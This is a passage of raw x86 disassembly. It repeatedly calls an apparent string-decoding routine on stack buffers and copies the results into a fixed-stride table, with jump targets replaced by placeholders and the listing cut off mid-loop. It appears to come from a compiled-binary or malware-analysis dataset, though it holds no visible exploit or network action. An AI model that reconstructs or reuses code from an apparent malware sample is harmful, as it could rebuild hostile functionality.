lea edi [ ebp - 0x210 ]
mov eax 0x107
call sub_1005b580
lea edi [ ebp - 0x29c ]
xor eax eax
call sub_1005b580
lea edi [ ebp - 0x540 ]
mov eax 0x113
call sub_1005b580
lea edi [ ebp - 0x100 ]
mov eax 0x101
call sub_1005b580
lea edi [ ebp - 0x18 ]
mov eax 0xd9
call sub_1005b580
lea edi [ ebp - 0xa28 ]
mov eax 0xc6
call sub_1005b580
lea edi [ ebp - 0x82c ]
mov eax 0x82
call sub_1005b580
lea edi [ ebp - 0x580 ]
mov eax 0xd7
call sub_1005b580
lea edi [ ebp - 0x7a4 ]
mov eax 0xcf
call sub_1005b580
lea edi [ ebp - 0x118 ]
mov eax 0xf3
call sub_1005b580
lea edi [ ebp - 0x850 ]
mov eax 0x2b
call sub_1005b580
lea edi [ ebp - 0x344 ]
mov eax 0x99
call sub_1005b580
lea edi [ ebp - 0x520 ]
mov eax 0x10c
call sub_1005b580
lea edi [ ebp - 0x600 ]
mov eax 0x73
call sub_1005b580
lea edi [ ebp - 0x380 ]
mov eax 0xdc
call sub_1005b580
lea edi [ ebp - 0xc40 ]
mov eax 0xbf
call sub_1005b580
lea edi [ ebp - 0x640 ]
mov eax 0xec
call sub_1005b580
lea edi [ ebp - 0xac8 ]
mov eax 0x14a
call sub_1005b580
lea edi [ ebp - 0xa0 ]
mov eax 0xdf
call sub_1005b580
lea edi [ ebp - 0x8c0 ]
mov eax 0xc2
call sub_1005b580
lea edi [ ebp - 0x264 ]
mov eax 0x64
call sub_1005b580
lea edi [ ebp - 0x88 ]
mov eax 0x36
call sub_1005b580
lea edi [ ebp - 0xb40 ]
mov eax 0x112
call sub_1005b580
lea edi [ ebp - 0x248 ]
mov eax 0x124
call sub_1005b580
lea edi [ ebp - 0x560 ]
mov eax 0x13c
call sub_1005b580
lea edi [ ebp - 0x960 ]
mov eax 0x110
call sub_1005b580
lea edi [ ebp - 0x168 ]
mov eax 0xfd
call sub_1005b580
lea edi [ ebp - 0xc6c ]
mov eax 0x108
call sub_1005b580
lea edi [ ebp - 0x1d8 ]
mov eax 0x26
call sub_1005b580
lea edi [ ebp - 0xbbc ]
mov eax 0xa0
call sub_1005b580
lea edi [ ebp - 0xd4c ]
mov eax 0xfc
call sub_1005b580
lea edi [ ebp - 0xa00 ]
mov eax 0xaf
call sub_1005b580
lea edi [ ebp - 0x1f4 ]
mov eax 0x1f
call sub_1005b580
lea edi [ ebp - 0x938 ]
mov eax 0x1b
call sub_1005b580
lea edi [ ebp - 0x9b0 ]
mov eax 0x71
call sub_1005b580
lea edi [ ebp - 0x500 ]
mov eax 0xb8
call sub_1005b580
lea edi [ ebp - 0xb18 ]
mov eax 0x131
call sub_1005b580
lea edi [ ebp - 0xb68 ]
mov eax 0xed
call sub_1005b580
lea edi [ ebp - 0xa50 ]
mov eax 0x12a
call sub_1005b580
lea edi [ ebp - 0x898 ]
mov eax 0xb4
call sub_1005b580
lea edi [ ebp - 0x30c ]
mov eax 0x4e
call sub_1005b580
lea edi [ ebp - 0xcd0 ]
mov eax 0x35
call sub_1005b580
lea edi [ ebp - 0x22c ]
mov eax 0x10a
call sub_1005b580
lea edi [ ebp - 0xa78 ]
mov eax 0x39
call sub_1005b580
lea edi [ ebp - 0x184 ]
mov eax 0x8a
call sub_1005b580
lea edi [ ebp - 0x2b8 ]
mov eax 0xa
call sub_1005b580
lea edi [ ebp - 0xb90 ]
mov eax 0x143
call sub_1005b580
lea edi [ ebp - 0x988 ]
mov eax 0x118
call sub_1005b580
lea edi [ ebp - 0x5e0 ]
mov eax 0x154
call sub_1005b580
lea edi [ ebp - 0x3e0 ]
mov eax 0x104
call sub_1005b580
lea edi [ ebp - 0x738 ]
mov eax 0xc8
call sub_1005b580
lea edi [ ebp - 0x4e0 ]
mov eax 0x23
call sub_1005b580
lea edi [ ebp - 0x2d4 ]
mov eax 0xcc
call sub_1005b580
lea edi [ ebp - 0x8e8 ]
mov eax 0x5f
call sub_1005b580
lea edi [ ebp - 0xe8 ]
mov eax 0xcb
call sub_1005b580
lea edi [ ebp - 0xaa0 ]
mov eax 0x85
call sub_1005b580
lea edi [ ebp - 0x910 ]
mov eax 0x122
call sub_1005b580
lea edi [ ebp - 0x58 ]
mov eax 0x9b
call sub_1005b580
lea edi [ ebp - 0x620 ]
mov eax 0x58
call sub_1005b580
lea edi [ ebp - 0x2f0 ]
mov eax 0x91
call sub_1005b580
lea edi [ ebp - 0x360 ]
mov eax 0x132
call sub_1005b580
lea edi [ ebp - 0x1bc ]
mov eax 0x44
call sub_1005b580
lea edi [ ebp - 0x5a0 ]
mov eax 0xfa
call sub_1005b580
lea edi [ ebp - 0x660 ]
mov eax 0x7
call sub_1005b580
lea edi [ ebp - 0x808 ]
mov eax 0x123
call sub_1005b580
lea edi [ ebp - 0x420 ]
mov eax 0x3f
call sub_1005b580
lea edi [ ebp - 0x6f0 ]
mov eax 0x14e
call sub_1005b580
lea edi [ ebp - 0x714 ]
mov eax 0x6f
call sub_1005b580
lea edi [ ebp - 0x130 ]
mov eax 0x135
call sub_1005b580
lea eax [ ebp - 0x780 ]
lea edx [ eax + 0x1 ]
pop edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x780 ]
push edx
push esi
call sub_1007f5d0
lea eax [ ebp - 0xbe8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xbe8 ]
push eax
lea ecx [ esi + 0x108 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x2c ]
add esp 0xc
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x2c ]
push edx
lea eax [ esi + 0x210 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x6a8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x6a8 ]
push ecx
lea edx [ esi + 0x318 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x280 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x280 ]
push eax
lea ecx [ esi + 0x420 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x3a0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x3a0 ]
push edx
lea eax [ esi + 0x528 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0xd0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xd0 ]
push ecx
lea edx [ esi + 0x630 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x440 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x440 ]
push eax
lea ecx [ esi + 0x738 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0xc9c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xc9c ]
push edx
lea eax [ esi + 0x840 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x480 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x480 ]
push ecx
lea edx [ esi + 0x948 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x5c0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x5c0 ]
push eax
lea ecx [ esi + 0xa50 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0xaf0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xaf0 ]
push edx
lea eax [ esi + 0xb58 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0xb8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xb8 ]
push ecx
lea edx [ esi + 0xc60 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x14c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x14c ]
push eax
lea ecx [ esi + 0xd68 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x4c0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x4c0 ]
push edx
lea eax [ esi + 0xe70 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x7e4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x7e4 ]
push ecx
lea edx [ esi + 0xf78 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x75c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x75c ]
push eax
lea ecx [ esi + 0x1080 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x3c0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x3c0 ]
push edx
lea eax [ esi + 0x1188 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0xc14 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xc14 ]
push ecx
lea edx [ esi + 0x1290 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x684 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x684 ]
push eax
lea ecx [ esi + 0x1398 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x460 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x460 ]
push edx
lea eax [ esi + 0x14a0 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x70 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x70 ]
push ecx
lea edx [ esi + 0x15a8 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x400 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x400 ]
push eax
lea ecx [ esi + 0x16b0 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x874 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x874 ]
push edx
lea eax [ esi + 0x17b8 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x328 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x328 ]
push ecx
lea edx [ esi + 0x18c0 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x40 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x40 ]
push eax
lea ecx [ esi + 0x19c8 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0xd0c ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xd0c ]
push edx
lea eax [ esi + 0x1ad0 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x9d8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x9d8 ]
push ecx
lea edx [ esi + 0x1bd8 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x1a0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x1a0 ]
push eax
lea ecx [ esi + 0x1ce0 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x6cc ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x6cc ]
push edx
lea eax [ esi + 0x1de8 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x4a0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x4a0 ]
push ecx
lea edx [ esi + 0x1ef0 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x210 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x210 ]
push eax
lea ecx [ esi + 0x1ff8 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x29c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x29c ]
push edx
lea eax [ esi + 0x2100 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x540 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x540 ]
push ecx
lea edx [ esi + 0x2208 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x100 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x100 ]
push eax
lea ecx [ esi + 0x2310 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x18 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x18 ]
push edx
lea eax [ esi + 0x2418 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0xa28 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xa28 ]
push ecx
lea edx [ esi + 0x2520 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x82c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x82c ]
push eax
lea ecx [ esi + 0x2628 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x580 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x580 ]
push edx
lea eax [ esi + 0x2730 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x7a4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x7a4 ]
push ecx
lea edx [ esi + 0x2838 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x118 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x118 ]
push eax
lea ecx [ esi + 0x2940 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x850 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x850 ]
push edx
lea eax [ esi + 0x2a48 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x344 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x344 ]
push ecx
lea edx [ esi + 0x2b50 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x520 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x520 ]
push eax
lea ecx [ esi + 0x2c58 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x600 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x600 ]
push edx
lea eax [ esi + 0x2d60 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x380 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x380 ]
push ecx
lea edx [ esi + 0x2e68 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0xc40 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xc40 ]
push eax
lea ecx [ esi + 0x2f70 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x640 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x640 ]
push edx
lea eax [ esi + 0x3078 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0xac8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xac8 ]
push ecx
lea edx [ esi + 0x3180 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0xa0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ esi + 0x3288 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x8c0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x8c0 ]
push edx
lea eax [ esi + 0x3390 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x264 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x264 ]
push ecx
lea edx [ esi + 0x3498 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x88 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x88 ]
push eax
lea ecx [ esi + 0x35a0 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0xb40 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xb40 ]
push edx
lea eax [ esi + 0x36a8 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x248 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x248 ]
push ecx
lea edx [ esi + 0x37b0 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x560 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x560 ]
push eax
lea ecx [ esi + 0x38b8 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x960 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x960 ]
push edx
lea eax [ esi + 0x39c0 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x168 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x168 ]
push ecx
lea edx [ esi + 0x3ac8 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0xc6c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xc6c ]
push eax
lea ecx [ esi + 0x3bd0 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x1d8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x1d8 ]
push edx
lea eax [ esi + 0x3cd8 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0xbbc ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xbbc ]
push ecx
lea edx [ esi + 0x3de0 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0xd4c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xd4c ]
push eax
lea ecx [ esi + 0x3ee8 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0xa00 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xa00 ]
push edx
lea eax [ esi + 0x3ff0 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x1f4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x1f4 ]
push ecx
lea edx [ esi + 0x40f8 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x938 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x938 ]
push eax
lea ecx [ esi + 0x4200 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x9b0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x9b0 ]
push edx
lea eax [ esi + 0x4308 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x500 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x500 ]
push ecx
lea edx [ esi + 0x4410 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0xb18 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xb18 ]
push eax
lea ecx [ esi + 0x4518 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0xb68 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xb68 ]
push edx
lea eax [ esi + 0x4620 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0xa50 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xa50 ]
push ecx
lea edx [ esi + 0x4728 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x898 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x898 ]
push eax
lea ecx [ esi + 0x4830 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x30c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x30c ]
push edx
lea eax [ esi + 0x4938 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0xcd0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xcd0 ]
push ecx
lea edx [ esi + 0x4a40 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x22c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x22c ]
push eax
lea ecx [ esi + 0x4b48 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0xa78 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xa78 ]
push edx
lea eax [ esi + 0x4c50 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x184 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x184 ]
push ecx
lea edx [ esi + 0x4d58 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x2b8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x2b8 ]
push eax
lea ecx [ esi + 0x4e60 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0xb90 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xb90 ]
push edx
lea eax [ esi + 0x4f68 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x988 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
